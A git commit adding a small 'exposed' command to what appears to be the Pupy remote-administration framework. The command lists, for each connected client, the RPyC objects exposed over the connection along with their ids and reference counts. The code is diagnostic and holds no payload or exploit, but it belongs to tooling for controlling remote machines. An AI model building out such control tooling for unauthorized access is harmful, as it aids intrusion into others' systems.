3b31aab0d11e1cff7da625987f60c6f0dc546e8a
Oleksii Shevchuk <alxchk@gmail.com>
2018-05-27 19:52:06 +0300

    Add command to quickly find out what is exposed to client

---
+++ pupy/commands/exposed.py
@@ -0,0 +1,25 @@
+# -*- encoding: utf-8 -*-
+
+from pupylib.PupyModule import PupyArgumentParser
+from pupylib.PupyOutput import Color, Table
+
+usage = 'list exposed objects/methods'
+parser = PupyArgumentParser(description=usage)
+
+def do(server, handler, config, modargs):
+    for client in server.get_clients(handler.default_filter):
+        objects = []
+        with client.conn._conn._local_objects._lock:
+            for klass, refcnt in \
+              client.conn._conn._local_objects._dict.itervalues():
+                objects.append({
+                    'OID': id(klass),
+                    'Object': repr(klass),
+                    'Refs': refcnt
+                })
+
+        handler.display(Table(
+            objects,
+            headers=['OID', 'Object', 'Refs'],
+            caption=client.short_name()
+        ))
